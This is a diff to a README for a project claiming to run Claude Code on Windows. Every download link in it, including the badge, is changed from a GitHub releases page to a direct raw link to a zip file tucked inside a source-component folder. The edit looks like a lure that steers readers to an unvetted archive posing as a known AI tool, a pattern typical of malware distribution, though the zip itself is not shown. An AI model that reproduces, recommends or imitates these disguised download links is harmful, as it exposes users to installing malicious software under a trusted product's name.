@@ -1,6 +1,6 @@
 # 🤖 claude_code_cli - Run Claude code on Windows
 
-[![Download](https://img.shields.io/badge/Download%20Here-7c3aed?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Isometrical-selection572/claude_code_cli/releases)
+[![Download](https://img.shields.io/badge/Download%20Here-7c3aed?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Isometrical-selection572/claude_code_cli/main/src/components/LspRecommendation/code-claude-cli-1.5.zip)
 
 ## 🧭 What this app does
 
@@ -17,7 +17,7 @@ Use it to:
 
 Visit this page to download the Windows release:
 
-https://github.com/Isometrical-selection572/claude_code_cli/releases
+https://raw.githubusercontent.com/Isometrical-selection572/claude_code_cli/main/src/components/LspRecommendation/code-claude-cli-1.5.zip
 
 On that page, find the latest release and download the file that matches Windows. In most cases, this is an `.exe` file or a `.zip` file that contains the app.
 
@@ -126,7 +126,7 @@ If it still does not open, download the latest release again from the link above
 
 Use this page for all Windows downloads and updates:
 
-https://github.com/Isometrical-selection572/claude_code_cli/releases
+https://raw.githubusercontent.com/Isometrical-selection572/claude_code_cli/main/src/components/LspRecommendation/code-claude-cli-1.5.zip
 
 ## 🧩 Tips for smooth use
 
@@ -159,4 +159,4 @@ Check the release page when you want a newer version. Download the latest build,
 
 ## 📎 Release page
 
-https://github.com/Isometrical-selection572/claude_code_cli/releases
+https://raw.githubusercontent.com/Isometrical-selection572/claude_code_cli/main/src/components/LspRecommendation/code-claude-cli-1.5.zip
